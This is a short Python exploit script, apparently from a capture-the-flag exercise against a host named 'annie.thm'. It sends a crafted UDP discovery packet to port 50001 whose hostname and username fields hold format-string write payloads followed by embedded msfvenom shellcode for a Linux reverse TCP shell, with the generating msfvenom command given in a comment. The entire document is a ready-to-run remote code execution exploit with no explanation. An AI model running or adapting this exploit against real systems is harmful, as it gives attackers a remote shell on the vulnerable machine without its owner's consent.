#!/usr/bin/env python3
import struct
import socket

ip = 'annie.thm'
port = 50001

def gen_discover_packet(ad_id, os_id, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x01])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x02, os_id])
    d += struct.pack('>I', len(hn)) + hn
    d += struct.pack('>I', len(user)) + user
    d += struct.pack('>I', 0)
    d += struct.pack('>I', len(inf)) + inf
    d += bytes([0x00])
    d += struct.pack('>I', len(func)) + func
    d += bytes([0x02, 0xc3, 0x51])
    return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -b "\x00\x25\x26"
shellcode  = b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x37\xab\x87"
shellcode += b"\xcd\x6f\xc9\x19\xb8\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x5d\x82\xdf\x54\x05"
shellcode += b"\xcb\x46\xd2\x36\xf5\x88\xc8\x27\x5e\x51\x01"
shellcode += b"\x35\xab\x82\xf4\xaf\x61\xbd\x40\x66\xe3\x0e"
shellcode += b"\x2b\x05\xd9\x43\xd2\x1d\xf3\x88\xc8\x05\xca"
shellcode += b"\x47\xf0\xc8\x65\xed\xec\x37\xc6\x1c\xcd\xc1"
shellcode += b"\xc1\xbc\x95\xf6\x81\xa2\x97\x55\xc2\xe9\xe2"
shellcode += b"\x1c\xa1\x19\xeb\x7f\x22\x60\x9f\x38\x81\x90"
shellcode += b"\x5e\x38\xae\x87\xcd\x6f\xc9\x19\xb8"

payload = gen_discover_packet(
    4919,
    1,
    b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode,
    b'\x85\xfe%18472249x%93$ln',
    b'ad',
    b'main'
)

print('[*] Sending payload...')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (ip, port))
sock.close()
print('[*] Payload sent')
